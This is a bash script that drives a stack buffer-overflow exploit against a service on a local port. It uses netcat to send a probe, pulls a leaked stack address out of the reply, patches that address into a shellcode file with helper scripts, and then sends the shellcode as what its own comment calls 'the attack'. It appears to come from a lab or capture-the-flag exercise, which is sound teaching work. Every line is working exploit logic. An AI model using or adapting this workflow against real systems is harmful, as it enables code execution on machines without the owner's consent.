#!/bin/bash

if [ $# != 2 ]
then
    echo "usage: $0 <shellcode.inp> <port>"
    exit
fi

shellfile=$1
port=$2

#send probe to find address (and extract this address from the reply)
ebp=`cat getaddress.inp | nc 127.0.0.1 $port | hexdump -C | grep -m 1 -o -G [0-9a-f][0-9a-f][[:space:]][0-9a-f][0-9a-f][[:space:]][0-9a-f][0-9a-f][[:space:]]bf`
echo "ebp=$ebp"

buf=`./calcAddr.sh $ebp`
echo "buf=$buf"

#now patch in the address
./patchaddr.py $shellfile tmp.$shellfile $buf 
mv tmp.$shellfile $shellfile

#and send the attack
echo "cat $shellfile |  nc 127.0.0.1 $port"

cat $shellfile |  nc 127.0.0.1 $port


